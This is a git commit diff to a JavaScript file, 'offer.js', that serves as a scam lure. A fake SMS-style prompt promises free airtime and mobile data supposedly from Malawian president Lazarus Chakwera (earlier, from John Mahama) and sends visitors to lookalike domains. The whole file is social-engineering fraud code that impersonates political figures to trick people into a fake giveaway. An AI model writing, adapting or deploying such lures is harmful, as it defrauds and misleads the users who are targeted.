38e175c65df37f7a30b3339696f95e05abcd4dbb
essac5523me <essac5523+me@gmail.com>
2025-03-02 10:46:40 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '20GB Free Data'
+password=prompt('SMS: Congratulations You are Eligible to receive k7000 Airtime and 20GB Free Data From LAZARUS CHAKWERA Offer, Kindly Press OK to ACTIVATE ','20GB Free Data');
+if (password != '20GB Free Data') {
+location.href='https://lazarus-chakwera.4g-data.pro/20GB';
 }
